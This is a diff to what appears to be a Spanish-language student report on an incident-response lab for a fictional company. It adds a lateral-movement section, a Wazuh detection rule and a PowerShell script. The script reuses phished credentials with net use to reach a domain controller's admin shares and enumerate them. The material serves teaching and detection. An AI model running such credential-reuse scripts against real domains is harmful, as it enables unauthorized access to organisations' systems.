@@ -177,7 +177,7 @@ Consolido toda la información anterior en una ficha que acompaña al incidente 
 | Activos afectados | PC-RRHH-01 (10.10.10.50), credenciales de `rrhh.ana`, CSV de clientes |
 | Indicadores (IOC) | IP del C2 10.10.10.100; portal falso; hashes recogidos en `iocs.csv` |
 | Gravedad | ALTA (pasa a CRÍTICA si se confirma la exfiltración) |
-| Técnicas MITRE | T1566.002, T1056.003, T1059.001, T1033, T1087, T1071, T1041 |
+| Técnicas MITRE | T1566.002, T1056.003, T1059.001, T1033, T1087, T1071, T1041, T1078, T1021.002 |
 | Estado | En investigación → contención |
 | Responsable | Coordinador del equipo de respuesta |
 | Acciones realizadas | Detección en el SIEM, preservación de evidencias y análisis OSINT |
@@ -277,6 +277,8 @@ Para estudiar la comunicación con el atacante monté un **servidor C2 propio** 
     Tecnicas: C2 (T1071) y exfiltracion por el canal C2 (T1041).
 ```
 
+`[CAPTURA: consola del C2 mostrando "200 bytes guardados en recibidos/..." y el fichero en la carpeta recibidos/]`
+
 ### 3.5 Detección correlada en Wazuh
 
 Todo lo anterior lo observo, en paralelo, desde el SIEM. Para ello escribí **reglas personalizadas** (`local_rules.xml`) que, con la telemetría de Sysmon, convierten la actividad del atacante en alertas con su nivel de severidad y su técnica MITRE asociada:
@@ -286,10 +288,21 @@ Todo lo anterior lo observo, en paralelo, desde el SIEM. Para ello escribí **re
 | 100200 | Comando de reconocimiento ejecutado | 10 | T1033 / T1087 |
 | 100201 | PowerShell de descarga o exfiltración | 12 | T1059.001 / T1041 |
 | 100202 | Conexión saliente a la IP del atacante (10.10.10.100) | 12 | T1071 |
+| 100203 | Movimiento lateral: login de `rrhh.ana` desde la víctima al DC | 12 | T1078 / T1021.002 |
 
 El resultado fueron **20 alertas de reconocimiento** (regla 100200) y **3 alertas de nivel 12** correspondientes a la exfiltración y el C2. Lo valioso es el detalle forense que acompaña a cada alerta. La siguiente captura, tomada de la vista *Discover* de Wazuh, muestra un único evento de reconocimiento con toda su cadena de evidencia: el comando ejecutado (`systeminfo`), su proceso padre (`cmd.exe /c systeminfo`), el usuario (`NEXORA\Administrador`), el nivel de integridad, el canal de Sysmon y el **hash SHA-256** del binario —el mismo que se verificó por OSINT en el punto 3.3—. Así se cierra el círculo entre la telemetría del endpoint y el análisis:
 
 ![Detalle forense de un evento de reconocimiento en Wazuh](images/03-wazuh-evento-forense.png)
+
+### 3.6 Movimiento lateral con credenciales robadas
+
+El phishing no roba credenciales por capricho: el objetivo es **reutilizarlas para avanzar por el dominio**. Para demostrarlo, con el script `movimiento-lateral.ps1` uso las credenciales capturadas (`rrhh.ana` / `verano2027`) desde PC-RRHH-01 para **autenticarme contra el controlador de dominio DC-NEXORA** mediante `net use` sobre su recurso administrativo. No hace falta malware: basta una credencial válida y herramientas nativas de Windows.
+
+Ese acceso deja huella en el DC como un **inicio de sesión 4624 de tipo 3** (sesión por red) a nombre de `rrhh.ana` y con origen la IP de la víctima (10.10.10.50). La **regla 100203** de Wazuh lo detecta y lo eleva a alerta de nivel 12, cerrando el escenario del enunciado (el atacante salta de la víctima al dominio). En términos de MITRE ATT&CK corresponde a **T1078** (*Valid Accounts*) y **T1021.002** (*SMB/Windows Admin Shares*).
+
+> Para que la alerta aparezca en Wazuh, DC-NEXORA debe tener instalado el agente enviando su canal *Security*. Si no lo tiene, el inicio de sesión 4624 se comprueba igualmente en el **Visor de eventos** del propio DC.
+
+`[CAPTURA: evento 4624 (tipo 3) de rrhh.ana en el DC y/o la alerta 100203 en Wazuh]`
 
 ---
 
@@ -693,6 +706,63 @@ try {
 } catch {}
 
 Write-Host "`n[+] Emulacion completada. Revisa las alertas en Wazuh." -ForegroundColor Green
+```
+
+### `movimiento-lateral.ps1`
+
+*Movimiento lateral: uso de credenciales robadas contra el DC (T1078/T1021.002).*
+
+```powershell
+<#
+=====================================================================
+ movimiento-lateral.ps1
+ ---------------------------------------------------------------------
+ Proyecto : TP Gestion de un incidente de ciberseguridad (Nexora S.L.)
+ Autor    : Luis Fernando Arrosquipa (GitHub: Fer1399)
+ Apartado : 3 - Investigacion / movimiento lateral
+
+ Demuestra el MOVIMIENTO LATERAL con credenciales robadas: usa las
+ credenciales capturadas en el phishing (rrhh.ana / verano2027) para
+ autenticarse desde PC-RRHH-01 contra el controlador de dominio
+ DC-NEXORA. Esto genera en el DC un inicio de sesion 4624 (tipo 3,
+ por red) a nombre de rrhh.ana y con origen la IP de la victima, que
+ Wazuh detecta con la regla 100203.
+
+ NO es malware: usa herramientas nativas de Windows (net use / net view).
+ MITRE: T1078 (Valid Accounts) + T1021.002 (SMB/Windows Admin Shares).
+
+ ENTORNO: laboratorio aislado. Credenciales FICTICIAS de demostracion.
+ USO (PowerShell en PC-RRHH-01):
+     .\movimiento-lateral.ps1 -DC 10.10.10.10
+=====================================================================
+#>
+param(
+    [string]$DC       = "10.10.10.10",
+    [string]$Usuario  = "NEXORA\rrhh.ana",
+    [string]$Password = "verano2027"   # credencial ficticia robada en el phishing
+)
+
+Write-Host "==== Movimiento lateral con credenciales robadas ====" -ForegroundColor Cyan
+Write-Host "[*] Autenticando contra el DC $DC como $Usuario ..." -ForegroundColor Yellow
+
+# 1) Montar el recurso administrativo del DC con las credenciales comprometidas.
+#    Esto provoca el inicio de sesion 4624 (tipo 3) en el DC.
+net use "\\$DC\IPC$" /user:$Usuario $Password
+
+# 2) Reconocimiento con credenciales validas: recursos del DC.
+Write-Host "`n[*] Enumerando recursos compartidos del DC:" -ForegroundColor Yellow
+net view "\\$DC"
+
+# 3) Intento de acceso al recurso administrativo C$ (dependera de permisos).
+Write-Host "`n[*] Intentando listar \\$DC\C$ :" -ForegroundColor Yellow
+cmd /c "dir \\$DC\C$" 2>$null
+
+# 4) Limpieza de la conexion.
+net use "\\$DC\IPC$" /delete 2>$null
+
+Write-Host "`n[+] Hecho." -ForegroundColor Green
+Write-Host "    En el DC: evento 4624 (tipo 3) de rrhh.ana desde 10.10.10.50." -ForegroundColor Green
+Write-Host "    En Wazuh: alerta 100203 (movimiento lateral)." -ForegroundColor Green
 ```
 
 ### `c2-server.py`
@@ -1527,6 +1597,18 @@ Se editan en `/var/ossec/etc/rules/local_rules.xml` del gestor. Combinadas con l
     <field name="win.eventdata.destinationIp">10.10.10.100</field>
     <description>NEXORA: Conexion saliente a la IP del atacante (C2)</description>
     <mitre><id>T1071</id></mitre>
+  </rule>
+
+  <!-- 100203: movimiento lateral - credenciales robadas usadas contra el DC -->
+  <!-- Requiere que DC-NEXORA tenga agente Wazuh enviando el canal Security -->
+  <rule id="100203" level="12">
+    <if_group>windows_security</if_group>
+    <field name="win.system.eventID">^4624$</field>
+    <field name="win.eventdata.logonType">^3$</field>
+    <field name="win.eventdata.targetUserName">rrhh.ana</field>
+    <field name="win.eventdata.ipAddress">10.10.10.50</field>
+    <description>NEXORA: Movimiento lateral - login de rrhh.ana desde la victima hacia el DC</description>
+    <mitre><id>T1078</id><id>T1021.002</id></mitre>
   </rule>
 
 </group>
